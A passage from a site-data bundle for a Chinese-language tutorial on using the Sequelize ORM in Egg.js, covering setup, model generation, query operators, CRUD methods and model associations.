{\n        if (prop === 'getdate') {\n            return target.getdate.bind(target);\n        }\n        return reflect.get(target, prop);\n    }\n};\nconst proxy = new proxy(target, handler);\n\nproxy.getdate() // 1\n",charsets:{cjk:!0}},{frontmatter:{},regularPath:"/Node/Egg/Egg.html",relativePath:"Node/Egg/Egg.md",key:"v-4d756216",path:"/Node/Egg/Egg.html",headersStr:null,content:"egg",normalizedContent:"egg",charsets:{}},{title:"Sequelize-egg 中的使用",frontmatter:{},regularPath:"/Node/Egg/Sequelize.html",relativePath:"Node/Egg/Sequelize.md",key:"v-37d7ea1c",path:"/Node/Egg/Sequelize.html",headers:[{level:2,title:"安装",slug:"安装",normalizedTitle:"安装",charIndex:25},{level:2,title:"配置更改",slug:"配置更改",normalizedTitle:"配置更改",charIndex:75},{level:2,title:"编写代码",slug:"编写代码",normalizedTitle:"编写代码",charIndex:381},{level:3,title:"创建所需的MOdel",slug:"创建所需的model",normalizedTitle:"创建所需的model",charIndex:390},{level:3,title:"详细文档地址",slug:"详细文档地址",normalizedTitle:"详细文档地址",charIndex:511},{level:3,title:"sequelize-automate 命令详解",slug:"sequelize-automate-命令详解",normalizedTitle:"sequelize-automate 命令详解",charIndex:522},{level:3,title:"生成的Module 需要注意的事项",slug:"生成的module-需要注意的事项",normalizedTitle:"生成的module 需要注意的事项",charIndex:1167},{level:2,title:"sequelize的一些使用方法",slug:"sequelize的一些使用方法",normalizedTitle:"sequelize的一些使用方法",charIndex:3112},{level:3,title:"INSERT",slug:"insert",normalizedTitle:"insert",charIndex:3163},{level:3,title:"SELECT",slug:"select",normalizedTitle:"select",charIndex:3575},{level:3,title:"WHERE",slug:"where",normalizedTitle:"where",charIndex:4767},{level:3,title:"UPDATE",slug:"update",normalizedTitle:"update",charIndex:9995},{level:3,title:"DELETE",slug:"delete",normalizedTitle:"delete",charIndex:6195},{level:3,title:"findAll",slug:"findall",normalizedTitle:"findall",charIndex:3617},{level:3,title:"findByPk",slug:"findbypk",normalizedTitle:"findbypk",charIndex:10393},{level:3,title:"findOne",slug:"findone",normalizedTitle:"findone",charIndex:10620},{level:3,title:"findOrCreate",slug:"findorcreate",normalizedTitle:"findorcreate",charIndex:10928},{level:3,title:"findAndCountAll",slug:"findandcountall",normalizedTitle:"findandcountall",charIndex:11603},{level:2,title:"关联查的一些方法",slug:"关联查的一些方法",normalizedTitle:"关联查的一些方法",charIndex:12039},{level:3,title:"一对一关系",slug:"一对一关系",normalizedTitle:"一对一关系",charIndex:12444},{level:3,title:"一对多关系",slug:"一对多关系",normalizedTitle:"一对多关系",charIndex:12231}],headersStr:"安装 配置更改 编写代码 创建所需的MOdel 详细文档地址 sequelize-automate 命令详解 生成的Module 需要注意的事项 sequelize的一些使用方法 INSERT SELECT WHERE UPDATE DELETE findAll findByPk findOne findOrCreate findAndCountAll 关联查的一些方法 一对一关系 一对多关系",content:"# Sequelize-egg 中的使用\n\n\n# 安装\n\nnpm install --save egg-sequelize mysql2\n\n\n\n\n# 配置更改\n\n * 在 config/plugin.js 中引入 egg-sequelize 插件\n\nexports.sequelize = {\n    enable: true,\n    package: 'egg-sequelize',\n};\n\n\n * 在 config/config.default.js 中编写 sequelize 配置\n\nconfig.sequelize = {\n    dialect: 'mysql',\n    host: '127.0.0.1',\n    port: 3306,\n    database: 'egg-sequelize-doc-default',\n};\n\n\n\n# 编写代码\n\n\n# 创建所需的MOdel\n\n> app/model/ 目录下编写Model\n\n> 可使用 sequelize-automate 插件来自定义生成Model\n\n\nnpm install sequelize-automate --save\n\n\n\n# 详细文档地址\n\n\n# sequelize-automate 命令详解\n\n\nsequelize-automate 命令支持的参数主要有：\n\n--type, -t 指定 models 代码风格，当前可选值：js ts egg midway\n--dialect, -e 数据库类型，可选值：mysql sqlite postgres mssql mariadb\n--host, -h 数据库 host\n--database, -d 数据库名\n--user, -u 数据库用户名\n--password, -p 数据库密码\n--port, -P 数据库端口，默认：MySQL/MariaDB 3306，Postgres 5432，SSQL: 1433\n--output, -o 指定输出 models 文件的目录，默认会生成在当前目录下 models 文件夹中\n--camel, -C models 文件中代码是否使用驼峰发命名，默认 false\n--emptyDir, -r 是否清空 models 目录（即 -o 指定的目录），如果为 true，则生成 models 之前会清空对应目录，默认 false\n--config, -c 指定配置文件，可以在一个配置文件中指定命令的参数\n\n\n自定义的命令\n\nsequelize - automate - t js - h 127.0 .0 .1 - d Test - u Test - p 123456 - P 3306 - e mysql - o models\n\n\n\n# 生成的Module 需要注意的事项\n\n> 生成的Moudle 建议改成一下格式\n\nTIP\n\n * Model 的名字首字母建议大写\n\n'use strict';\nmodule.exports = sequelize => {\n    const {\n        model,\n        Sequelize: {\n            DataTypes\n        }\n    } = sequelize;\n    const attributes = {\n        id: {\n            type: DataTypes.INTEGER(11),\n            allowNull: false,\n            defaultValue: null,\n            primaryKey: true,\n            autoIncrement: true,\n            comment: null,\n            field: 'id',\n        },\n        user: {\n            type: DataTypes.STRING(255),\n            allowNull: false,\n            defaultValue: null,\n            primaryKey: false,\n            autoIncrement: false,\n            comment: null,\n            field: 'user',\n        },\n        pass: {\n            type: DataTypes.STRING(255),\n            allowNull: false,\n            defaultValue: null,\n            primaryKey: false,\n            autoIncrement: false,\n            comment: null,\n            field: 'pass',\n        },\n        create_data: {\n            type: DataTypes.DATE,\n            allowNull: false,\n            defaultValue: null,\n            primaryKey: false,\n            autoIncrement: false,\n            comment: null,\n            field: 'create_data',\n        },\n        update_data: {\n            type: DataTypes.DATE,\n            allowNull: false,\n            defaultValue: null,\n            primaryKey: false,\n            autoIncrement: false,\n            comment: null,\n            field: 'update_data',\n        },\n        logo: {\n            type: DataTypes.STRING(255),\n            allowNull: false,\n            defaultValue: null,\n            primaryKey: false,\n            autoIncrement: false,\n            comment: null,\n            field: 'logo',\n        },\n    };\n    const options = {\n        tableName: 'user',\n        comment: '',\n        indexes: [],\n    };\n    const UserModel = model.define('user_model', attributes, options);\n    return UserModel;\n};\n\n\n\n# sequelize的一些使用方法\n\nTIP\n\n此处只有部分的使用案例，具体移步到上述中文文档\n\n\n# INSERT\n\n> Model.create() 方法是使用 Model.build() 构建未保存实例并使用 instance.save() 保存实例的简写形式.\n\n * 方式一：调用 build 方法后对象只存在于内存中，需要进一步调用 save 方法才会保存到数据库中。\n\nlet user = UsersModel.build({\n    username: \"swnd\",\n    password: \"q11111\"\n});\nuser = await user.save();\n\n\n * 方式二：调用 create 方法后，会直接保存到数据库中。\n\nconst user = UsersModel.create({\n    username: 'zhangsan',\n    password: '123456'\n}, {\n    fields: ['username'] // 只允许更新这个\n})\n\n\n\n# SELECT\n\n> attributes 选择查出数据需要展示的字段\n\nModel.findAll({\n    attributes: ['foo', 'bar']\n});\n\n\n> 可以使用嵌套数组来重命名属性：\n\nModel.findAll({\n    attributes: ['foo', ['bar', 'baz'], 'qux']\n});\n\nSELECT foo, bar AS baz, qux FROM...\n\n\n> 你可以使用 sequelize.fn 进行聚合：\n\nModel.findAll({\n    attributes: [\n        'foo',\n        [sequelize.fn('COUNT', sequelize.col('hats')), 'n_hats']\n        'bar'\n    ]\n});\nSELECT foo, COUNT(hats) AS n_hats, bar FROM...\n\n\n使用聚合函数时, 必须为它提供一个别名, 以便能够从模型中访问它. 在上面的示例中, 你可以通过 instance.n_hats 获取帽子数量.\n\n> 有时, 如果只想添加聚合, 那么列出模型的所有属性可能会很麻烦：\n\n// 这是获取帽子数量的烦人方法(每列都有)\nModel.findAll({\n    attributes: [\n        'id', 'foo', 'bar', 'baz', 'qux', 'hats', // 我们必须列出所有属性...\n        [sequelize.fn('COUNT', sequelize.col('hats')), 'n_hats'] // 添加聚合...\n    ]\n});\n\n// 这个更短,并且更不易出错. 如果以后在模型中添加/删除属性,它仍然可以正常工作\nModel.findAll({\n    attributes: {\n        include: [\n            [sequelize.fn('COUNT', sequelize.col('hats')), 'n_hats']\n        ]\n    }\n});\nSELECT id, foo, bar, baz, qux, hats, COUNT(hats) AS n_hats FROM...\n\n\n> 同样, 也可以排除某些属性：\n\nModel.findAll({\n    attributes: {\n        exclude: ['baz']\n    }\n});\n--Assuming all columns are 'id', 'foo', 'bar', 'baz'\nand 'qux'\nSELECT id, foo, bar, qux FROM...\n\n\n\n# WHERE\n\n> where 参数用于过滤查询.where 子句有很多运算符, 可以从 Op 中以 Symbols 的形式使用.\n\n基础\n\nPost.findAll({\n    where: {\n        authorId: 2\n    }\n});\n// SELECT * FROM post WHERE authorId = 2\n\n\n可以看到没有显式传递任何运算符(来自Op), 因为默认情况下 Sequelize 假定进行相等比较. 上面的代码等效于：\n\nconst {\n    Op\n} = require(\"sequelize\");\nPost.findAll({\n    where: {\n        authorId: {\n            [Op.eq]: 2\n        }\n    }\n});\n// SELECT * FROM post WHERE authorId = 2\n\n\n可以传递多个校验:\n\nPost.findAll({\n    where: {\n        authorId: 12\n        status: 'active'\n    }\n});\n// SELECT * FROM post WHERE authorId = 12 AND status = 'active';\n\n\n就像在第一个示例中 Sequelize 推断出 Op.eq 运算符一样, 在这里 Sequelize 推断出调用者希望对两个检查使用 AND. 上面的代码等效于：\n\nconst {\n    Op\n} = require(\"sequelize\");\nPost.findAll({\n    where: {\n        [Op.and]: [{\n                authorId: 12\n            },\n            {\n                status: 'active'\n            }\n        ]\n    }\n});\n// SELECT * FROM post WHERE authorId = 12 AND status = 'active';\n\n\nOR 可以通过类似的方式轻松执行：\n\nconst {\n    Op\n} = require(\"sequelize\");\nPost.findAll({\n    where: {\n        [Op.or]: [{\n                authorId: 12\n            },\n            {\n                authorId: 13\n            }\n        ]\n    }\n});\n// SELECT * FROM post WHERE authorId = 12 OR authorId = 13;\n\n\n由于以上的 OR 涉及相同字段 , 因此 Sequelize 允许你使用稍有不同的结构, 该结构更易读并且作用相同：\n\nconst {\n    Op\n} = require(\"sequelize\");\nPost.destroy({\n    where: {\n        authorId: {\n            [Op.or]: [12, 13]\n        }\n    }\n});\n// DELETE FROM post WHERE authorId = 12 OR authorId = 13;\n\n\n操作符 Sequelize 提供了多种运算符.\n\nconst {\n    Op\n} = require(\"sequelize\");\nPost.findAll({\n    where: {\n        [Op.and]: [{\n            a: 5\n        }, {\n            b: 6\n        }], // (a = 5) AND (b = 6)\n        [Op.or]: [{\n            a: 5\n        }, {\n            b: 6\n        }], // (a = 5) OR (b = 6)\n        someAttribute: {\n            // 基本\n            [Op.eq]: 3, // = 3\n            [Op.ne]: 20, // != 20\n            [Op.is]: null, // IS NULL\n            [Op.not]: true, // IS NOT TRUE\n            [Op.or]: [5, 6], // (someAttribute = 5) OR (someAttribute = 6)\n\n            // 使用方言特定的列标识符 (以下示例中使用 PG):\n            [Op.col]: 'user.organization_id', // = \"user\".\"organization_id\"\n\n            // 数字比较\n            [Op.gt]: 6, // > 6\n            [Op.gte]: 6, // >= 6\n            [Op.lt]: 10, // < 10\n            [Op.lte]: 10, // <= 10\n            [Op.between]: [6, 10], // BETWEEN 6 AND 10\n            [Op.notBetween]: [11, 15], // NOT BETWEEN 11 AND 15\n\n            // 其它操作符\n\n            [Op.all]: sequelize.literal('SELECT 1'), // > ALL (SELECT 1)\n\n            [Op.in]: [1, 2], // IN [1, 2]\n            [Op.notIn]: [1, 2], // NOT IN [1, 2]\n\n            [Op.like]: '%hat', // LIKE '%hat'\n            [Op.notLike]: '%hat', // NOT LIKE '%hat'\n            [Op.startsWith]: 'hat', // LIKE 'hat%'\n            [Op.endsWith]: 'hat', // LIKE '%hat'\n            [Op.substring]: 'hat', // LIKE '%hat%'\n            [Op.iLike]: '%hat', // ILIKE '%hat' (不区分大小写) (仅 PG)\n            [Op.notILike]: '%hat', // NOT ILIKE '%hat'  (仅 PG)\n            [Op.regexp]: '^[h|a|t]', // REGEXP/~ '^[h|a|t]' (仅 MySQL/PG)\n            [Op.notRegexp]: '^[h|a|t]', // NOT REGEXP/!~ '^[h|a|t]' (仅 MySQL/PG)\n            [Op.iRegexp]: '^[h|a|t]', // ~* '^[h|a|t]' (仅 PG)\n            [Op.notIRegexp]: '^[h|a|t]', // !~* '^[h|a|t]' (仅 PG)\n\n            [Op.any]: [2, 3], // ANY ARRAY[2, 3]::INTEGER (仅 PG)\n\n            // 在 Postgres 中, Op.like/Op.iLike/Op.notLike 可以结合 Op.any 使用:\n            [Op.like]: {\n                [Op.any]: ['cat', 'hat']\n            } // LIKE ANY ARRAY['cat', 'hat']\n\n            // 还有更多的仅限 postgres 的范围运算符,请参见下文\n        }\n    }\n});\n\n\nOp.in 的简写语法 直接将数组参数传递给 where 将隐式使用 IN 运算符：\n\n\nPost.findAll({\n  where: {\n    id: [1,2,3] // 等同使用 `id: { [Op.in]: [1,2,3] }`\n  }\n});\n// SELECT ... FROM \"posts\" AS \"post\" WHERE \"post\".\"id\" IN (1, 2, 3);\n\n\n运算符的逻辑组合 运算符 Op.and, Op.or 和 Op.not 可用于创建任意复杂的嵌套逻辑比较.\n\n使用 Op.and 和 Op.or 示例#\n\nconst {\n    Op\n} = require(\"sequelize\");\n\nFoo.findAll({\n    where: {\n        rank: {\n            [Op.or]: {\n                [Op.lt]: 1000,\n                [Op.eq]: null\n            }\n        },\n        // rank < 1000 OR rank IS NULL\n\n        {\n            createdAt: {\n                [Op.lt]: new Date(),\n                [Op.gt]: new Date(new Date() - 24 * 60 * 60 * 1000)\n            }\n        },\n        // createdAt < [timestamp] AND createdAt > [timestamp]\n\n        {\n            [Op.or]: [{\n                    title: {\n                        [Op.like]: 'Boat%'\n                    }\n                },\n                {\n                    description: {\n                        [Op.like]: '%boat%'\n                    }\n                }\n            ]\n        }\n        // title LIKE 'Boat%' OR description LIKE '%boat%'\n    }\n});\n\n\n使用 Op.not 示例#\n\nProject.findAll({\n    where: {\n        name: 'Some Project',\n        [Op.not]: [{\n                id: [1, 2, 3]\n            },\n            {\n                description: {\n                    [Op.like]: 'Hello%'\n                }\n            }\n        ]\n    }\n});\n上面将生成：\n\nSELECT *\n    FROM `Projects`\nWHERE(\n    `Projects`.\n    `name` = 'a project'\n    AND NOT(\n        `Projects`.\n        `id`\n        IN(1, 2, 3) OR `Projects`.\n        `description`\n        LIKE 'Hello%'\n    )\n)\n\n\n\n# UPDATE\n\n// 将所有没有姓氏的人更改为 \"Doe\"\nawait UsersModel.update({\n    lastName: \"Doe\"\n}, {\n    where: {\n        lastName: null\n    }\n});\n\n\n\n# DELETE\n\n// 删除所有名为 \"Jane\" 的人 \nawait UsersModel.destroy({\n  where: {\n\n    firstName: \"Jane\"\n\n  }\n}); \n\n\n\n> 要销毁所有内容,可以使用 TRUNCATE SQL：\n\n// 截断表格\nawait User.destroy({\n  truncate: true\n});\n\n\n\n# findAll\n\nfindAll 方法. 它生成一个标准的 SELECT 查询, 该查询将从表中检索所有条目(除非受到 where 子句的限制).\n\n\n# findByPk\n\nfindByPk 方法使用提供的主键从表中仅获得一个条目.\n\nconst project = await Project.findByPk(123);\nif (project === null) {\n    console.log('Not found!');\n} else {\n    console.log(project instanceof Project); // true\n    // 它的主键是 123\n}\n\n\n\n# findOne\n\nfindOne 方法获得它找到的第一个条目(它可以满足提供的可选查询参数).\n\nconst project = await Project.findOne({\n    where: {\n        title: 'My Title'\n    }\n});\nif (project === null) {\n    console.log('Not found!');\n} else {\n    console.log(project instanceof Project); // true\n    console.log(project.title); // 'My Title'\n}\n\n\n\n# findOrCreate\n\n> 除非找到一个满足查询参数的结果, 否则方法 findOrCreate 将在表中创建一个条目. 在这两种情况下, 它将返回一个实例(找到的实例或创建的实例)和一个布尔值, 指示该实例是已创建还是已经存在.\n\n使用 where 参数来查找条目, 而使用 defaults 参数来定义必须创建的内容. 如果 defaults 不包含每一列的值, 则 Sequelize 将采用 where 的值(如果存在).\n\n假设我们有一个空的数据库, 该数据库具有一个 User 模型, 该模型具有一个 username 和一个 job.\n\nconst [user, created] = await User.findOrCreate({\n    where: {\n        username: 'sdepold'\n    },\n    defaults: {\n        job: 'Technical Lead JavaScript'\n    }\n});\nconsole.log(user.username); // 'sdepold'\nconsole.log(user.job); // 这可能是也可能不是 'Technical Lead JavaScript'\nconsole.log(created); // 指示此实例是否刚刚创建的布尔值\nif (created) {\n    console.log(user.job); // 这里肯定是 'Technical Lead JavaScript'\n}\n\n\n\n# findAndCountAll\n\n> findAndCountAll 方法是结合了 findAll 和 count 的便捷方法. 在处理与分页有关的查询时非常有用, 在分页中, 你想检索带有 limit 和 offset 的数据, 但又需要知道与查询匹配的记录总数.\n\nfindAndCountAll 方法返回一个具有两个属性的对象：\n\ncount - 一个整数 - 符合查询条件的记录总数\nrows - 一个数组对象 - 获得的记录\nconst {\n    count,\n    rows\n} = await Project.findAndCountAll({\n    where: {\n        title: {\n            [Op.like]: 'foo%'\n        }\n    },\n    offset: 10,\n    limit: 2\n});\nconsole.log(count);\nconsole.log(rows);\n\n\n\n# 关联查的一些方法\n\n> Sequelize 支持标准关联关系: 一对一, 一对多 和 多对多.\n\n * A.hasOne(B) 关联意味着 A 和 B 之间存在一对一的关系, 外键在目标模型(B)中定义.\n\n * A.belongsTo(B)关联意味着 A 和 B 之间存在一对一的关系, 外键在源模型中定义(A).\n\n * A.hasMany(B) 关联意味着 A 和 B 之间存在一对多关系, 外键在目标模型(B)中定义.\n\n> 这三个调用将导致 Sequelize 自动将外键添加到适当的模型中(除非它们已经存在).\n\n * A.belongsToMany(B, { through: 'C' }) 关联意味着将表 C 用作联结表, 在 A 和 B 之间存在多对多关系. 具有外键(例如, aId 和 bId). Sequelize 将自动创建此模型 C(除非已经存在), 并在其上定义适当的外\n\n\n# 一对一关系\n\n> 对于本示例的其余部分, 我们假设我们有两个模型, 即 Foo 和 Bar. 我们想要在它们之间建立一对一的关系, 以便 Bar 获得 fooId 列.\n\n实现该目标的主要设置如下：\n\nFoo.hasOne(Bar);\nBar.belongsTo(Foo);\n\n\n自定义外键\n\n> 上面显示的 hasOne 和 belongsTo 调用都会推断出要创建的外键应称为 fooId. 如要使用其他名称, 例如 myFooId：\n\n// 方法 1\nFoo.hasOne(Bar, {\n    foreignKey: 'myFooId', //从表的id\n    as: 'acticle', //定义别名\n    sourceKey: 'article_id' //当前主表的id \n});\nBar.belongsTo(Foo);\n\n// 方法 2\nFoo.hasOne(Bar, {\n    foreignKey: {\n        name: 'myFooId'\n    }\n});\nBar.belongsTo(Foo);\n\n// 方法 3\nFoo.hasOne(Bar);\nBar.belongsTo(Foo, {\n    foreignKey: 'myFooId'\n});\n\n// 方法 4\nFoo.hasOne(Bar);\nBar.belongsTo(Foo, {\n    foreignKey: {\n        name: 'myFooId'\n    }\n});\n\n\nTIP\n\nShip.belongsTo(Captain, {\n    targetKey: 'name',\n    foreignKey: 'captainName'\n});\nA.hasOne(B) 和 A.hasMany(B) 将外键保留在目标模型(B)中,因此引用的键在源模型中,因此使用了 sourceKey. \n原模型 需要关联的字段id 是  sourceKey\nforeignKey 对应的id 是目标源的id\nA.belongsTo(B) 将外键保留在源模型中(A),因此引用的键在目标模型中,因此使用了 targetKey.\n外键保存源模型  foreignKey  为查询的从 id\n外键保存目标模型  foreignKey  为主的 id\n\n\n\n以上方法可用于一对一\n\n强制性与可选性关联\n\n> 默认情况下, 该关联被视为可选. 换句话说, 在我们的示例中, fooId 允许为空, 这意味着一个 Bar 可以不存在 Foo 而存在. 只需在外键选项中指定 allowNull: false 即可更改此设置：\n\nFoo.hasOne(Bar, {\n    foreignKey: {\n        allowNull: false\n    }\n});\n\n\n\n# 一对多关系\n\n> 在这个例子中, 我们有模型 Team 和 Player. 我们要告诉 Sequelize, 他们之间存在一对多的关系, 这意味着一个 Team 有 Player , 而每个 Player 都属于一个 Team.\n\nTeam.hasMany(Player);\nPlayer.belongsTo(Team);\n\n\nTeam.hasMany(Player, {\n    foreignKey: 'myFooId', //从表的id\n    as: 'acticle', //定义别名\n    sourceKey: 'article_id' //当前主表的id \n});\nPlayer.belongsTo(Team);\n",normalizedContent:"# sequelize-egg 中的使用\n\n\n# 安装\n\nnpm install --save egg-sequelize mysql2\n\n\n\n\n# 配置更改\n\n * 在 config/plugin.js 中引入 egg-sequelize 插件\n\nexports.sequelize = {\n    enable: true,\n    package: 'egg-sequelize',\n};\n\n\n * 在 config/config.default.js 中编写 sequelize 配置\n\nconfig.sequelize = {\n    dialect: 'mysql',\n    host: '127.0.0.1',\n    port: 3306,\n    database: 'egg-sequelize-doc-default',\n};\n\n\n\n# 编写代码\n\n\n# 创建所需的model\n\n> app/model/ 目录下编写model\n\n> 可使用 sequelize-automate 插件来自定义生成model\n\n\nnpm install sequelize-automate --save\n\n\n\n# 详细文档地址\n\n\n# sequelize-automate 命令详解\n\n\nsequelize-automate 命令支持的参数主要有：\n\n--type, -t 指定 models 代码风格，当前可选值：js ts egg midway\n--dialect, -e 数据库类型，可选值：mysql sqlite postgres mssql mariadb\n--host, -h 数据库 host\n--database, -d 数据库名\n--user, -u 数据库用户名\n--password, -p 数据库密码\n--port, -p 数据库端口，默认：mysql/mariadb 3306，postgres 5432，ssql: 1433\n--output, -o 指定输出 models 文件的目录，默认会生成在当前目录下 models 文件夹中\n--camel, -c models 文件中代码是否使用驼峰发命名，默认 false\n--emptydir, -r 是否清空 models 目录（即 -o 指定的目录），如果为 true，则生成 models 之前会清空对应目录，默认 false\n--config, -c 指定配置文件，可以在一个配置文件中指定命令的参数\n\n\n自定义的命令\n\nsequelize - automate - t js - h 127.0 .0 .1 - d test - u test - p 123456 - p 3306 - e mysql - o models\n\n\n\n# 生成的module 需要注意的事项\n\n> 生成的moudle 建议改成一下格式\n\ntip\n\n * model 的名字首字母建议大写\n\n'use strict';\nmodule.exports = sequelize => {\n    const {\n        model,\n        sequelize: {\n            datatypes\n        }\n    } = sequelize;\n    const attributes = {\n        id: {\n            type: datatypes.integer(11),\n            allownull: false,\n            defaultvalue: null,\n            primarykey: true,\n            autoincrement: true,\n            comment: null,\n            field: 'id',\n        },\n        user: {\n            type: datatypes.string(255),\n            allownull: false,\n            defaultvalue: null,\n            primarykey: false,\n            autoincrement: false,\n            comment: null,\n            field: 'user',\n        },\n        pass: {\n            type: datatypes.string(255),\n            allownull: false,\n            defaultvalue: null,\n            primarykey: false,\n            autoincrement: false,\n            comment: null,\n            field: 'pass',\n        },\n        create_data: {\n            type: datatypes.date,\n            allownull: false,\n            defaultvalue: null,\n            primarykey: false,\n            autoincrement: false,\n            comment: null,\n            field: 'create_data',\n        },\n        update_data: {\n            type: datatypes.date,\n            allownull: false,\n            defaultvalue: null,\n            primarykey: false,\n            autoincrement: false,\n            comment: null,\n            field: 'update_data',\n        },\n        logo: {\n            type: datatypes.string(255),\n            allownull: false,\n            defaultvalue: null,\n            primarykey: false,\n            autoincrement: false,\n            comment: null,\n            field: 'logo',\n        },\n    };\n    const options = {\n        tablename: 'user',\n        comment: '',\n        indexes: [],\n    };\n    const usermodel = model.define('user_model', attributes, options);\n    return usermodel;\n};\n\n\n\n# sequelize的一些使用方法\n\ntip\n\n此处只有部分的使用案例，具体移步到上述中文文档\n\n\n# insert\n\n> model.create() 方法是使用 model.build() 构建未保存实例并使用 instance.save() 保存实例的简写形式.\n\n * 方式一：调用 build 方法后对象只存在于内存中，需要进一步调用 save 方法才会保存到数据库中。\n\nlet user = usersmodel.build({\n    username: \"swnd\",\n    password: \"q11111\"\n});\nuser = await user.save();\n\n\n * 方式二：调用 create 方法后，会直接保存到数据库中。\n\nconst user = usersmodel.create({\n    username: 'zhangsan',\n    password: '123456'\n}, {\n    fields: ['username'] // 只允许更新这个\n})\n\n\n\n# select\n\n> attributes 选择查出数据需要展示的字段\n\nmodel.findall({\n    attributes: ['foo', 'bar']\n});\n\n\n> 可以使用嵌套数组来重命名属性：\n\nmodel.findall({\n    attributes: ['foo', ['bar', 'baz'], 'qux']\n});\n\nselect foo, bar as baz, qux from...\n\n\n> 你可以使用 sequelize.fn 进行聚合：\n\nmodel.findall({\n    attributes: [\n        'foo',\n        [sequelize.fn('count', sequelize.col('hats')), 'n_hats']\n        'bar'\n    ]\n});\nselect foo, count(hats) as n_hats, bar from...\n\n\n使用聚合函数时, 必须为它提供一个别名, 以便能够从模型中访问它. 在上面的示例中, 你可以通过 instance.n_hats 获取帽子数量.\n\n> 有时, 如果只想添加聚合, 那么列出模型的所有属性可能会很麻烦：\n\n// 这是获取帽子数量的烦人方法(每列都有)\nmodel.findall({\n    attributes: [\n        'id', 'foo', 'bar', 'baz', 'qux', 'hats', // 我们必须列出所有属性...\n        [sequelize.fn('count', sequelize.col('hats')), 'n_hats'] // 添加聚合...\n    ]\n});\n\n// 这个更短,并且更不易出错. 如果以后在模型中添加/删除属性,它仍然可以正常工作\nmodel.findall({\n    attributes: {\n        include: [\n            [sequelize.fn('count', sequelize.col('hats')), 'n_hats']\n        ]\n    }\n});\nselect id, foo, bar, baz, qux, hats, count(hats) as n_hats from...\n\n\n> 同样, 也可以排除某些属性：\n\nmodel.findall({\n    attributes: {\n        exclude: ['baz']\n    }\n});\n--assuming all columns are 'id', 'foo', 'bar', 'baz'\nand 'qux'\nselect id, foo, bar, qux from...\n\n\n\n# where\n\n> where 参数用于过滤查询.where 子句有很多运算符, 可以从 op 中以 symbols 的形式使用.\n\n基础\n\npost.findall({\n    where: {\n        authorid: 2\n    }\n});\n// select * from post where authorid = 2\n\n\n可以看到没有显式传递任何运算符(来自op), 因为默认情况下 sequelize 假定进行相等比较. 上面的代码等效于：\n\nconst {\n    op\n} = require(\"sequelize\");\npost.findall({\n    where: {\n        authorid: {\n            [op.eq]: 2\n        }\n    }\n});\n// select * from post where authorid = 2\n\n\n可以传递多个校验:\n\npost.findall({\n    where: {\n        authorid: 12\n        status: 'active'\n    }\n});\n// select * from post where authorid = 12 and status = 'active';\n\n\n就像在第一个示例中 sequelize 推断出 op.eq 运算符一样, 在这里 sequelize 推断出调用者希望对两个检查使用 and. 上面的代码等效于：\n\nconst {\n    op\n} = require(\"sequelize\");\npost.findall({\n    where: {\n        [op.and]: [{\n                authorid: 12\n            },\n            {\n                status: 'active'\n            }\n        ]\n    }\n});\n// select * from post where authorid = 12 and status = 'active';\n\n\nor 可以通过类似的方式轻松执行：\n\nconst {\n    op\n} = require(\"sequelize\");\npost.findall({\n    where: {\n        [op.or]: [{\n                authorid: 12\n            },\n            {\n                authorid: 13\n            }\n        ]\n    }\n});\n// select * from post where authorid = 12 or authorid = 13;\n\n\n由于以上的 or 涉及相同字段 , 因此 sequelize 允许你使用稍有不同的结构, 该结构更易读并且作用相同：\n\nconst {\n    op\n} = require(\"sequelize\");\npost.destroy({\n    where: {\n        authorid: {\n            [op.or]: [12, 13]\n        }\n    }\n});\n// delete from post where authorid = 12 or authorid = 13;\n\n\n操作符 sequelize 提供了多种运算符.\n\nconst {\n    op\n} = require(\"sequelize\");\npost.findall({\n    where: {\n        [op.and]: [{\n            a: 5\n        }, {\n            b: 6\n        }], // (a = 5) and (b = 6)\n        [op.or]: [{\n            a: 5\n        }, {\n            b: 6\n        }], // (a = 5) or (b = 6)\n        someattribute: {\n            // 基本\n            [op.eq]: 3, // = 3\n            [op.ne]: 20, // != 20\n            [op.is]: null, // is null\n            [op.not]: true, // is not true\n            [op.or]: [5, 6], // (someattribute = 5) or (someattribute = 6)\n\n            // 使用方言特定的列标识符 (以下示例中使用 pg):\n            [op.col]: 'user.organization_id', // = \"user\".\"organization_id\"\n\n            // 数字比较\n            [op.gt]: 6, // > 6\n            [op.gte]: 6, // >= 6\n            [op.lt]: 10, // < 10\n            [op.lte]: 10, // <= 10\n            [op.between]: [6, 10], // between 6 and 10\n            [op.notbetween]: [11, 15], // not between 11 and 15\n\n            // 其它操作符\n\n            [op.all]: sequelize.literal('select 1'), // > all (select 1)\n\n            [op.in]: [1, 2], // in [1, 2]\n            [op.notin]: [1, 2], // not in [1, 2]\n\n            [op.like]: '%hat', // like '%hat'\n            [op.notlike]: '%hat', // not like '%hat'\n            [op.startswith]: 'hat', // like 'hat%'\n            [op.endswith]: 'hat', // like '%hat'\n            [op.substring]: 'hat', // like '%hat%'\n            [op.ilike]: '%hat', // ilike '%hat' (不区分大小写) (仅 pg)\n            [op.notilike]: '%hat', // not ilike '%hat'  (仅 pg)\n            [op.regexp]: '^[h|a|t]', // regexp/~ '^[h|a|t]' (仅 mysql/pg)\n            [op.notregexp]: '^[h|a|t]', // not regexp/!~ '^[h|a|t]' (仅 mysql/pg)\n            [op.iregexp]: '^[h|a|t]', // ~* '^[h|a|t]' (仅 pg)\n            [op.notiregexp]: '^[h|a|t]', // !~* '^[h|a|t]' (仅 pg)\n\n            [op.any]: [2, 3], // any array[2, 3]::integer (仅 pg)\n\n            // 在 postgres 中, op.like/op.ilike/op.notlike 可以结合 op.any 使用:\n            [op.like]: {\n                [op.any]: ['cat', 'hat']\n            } // like any array['cat', 'hat']\n\n            // 还有更多的仅限 postgres 的范围运算符,请参见下文\n        }\n    }\n});\n\n\nop.in 的简写语法 直接将数组参数传递给 where 将隐式使用 in 运算符：\n\n\npost.findall({\n  where: {\n    id: [1,2,3] // 等同使用 `id: { [op.in]: [1,2,3] }`\n  }\n});\n// select ... from \"posts\" as \"post\" where \"post\".\"id\" in (1, 2, 3);\n\n\n运算符的逻辑组合 运算符 op.and, op.or 和 op.not 可用于创建任意复杂的嵌套逻辑比较.\n\n使用 op.and 和 op.or 示例#\n\nconst {\n    op\n} = require(\"sequelize\");\n\nfoo.findall({\n    where: {\n        rank: {\n            [op.or]: {\n                [op.lt]: 1000,\n                [op.eq]: null\n            }\n        },\n        // rank < 1000 or rank is null\n\n        {\n            createdat: {\n                [op.lt]: new date(),\n                [op.gt]: new date(new date() - 24 * 60 * 60 * 1000)\n            }\n        },\n        // createdat < [timestamp] and createdat > [timestamp]\n\n        {\n            [op.or]: [{\n                    title: {\n                        [op.like]: 'boat%'\n                    }\n                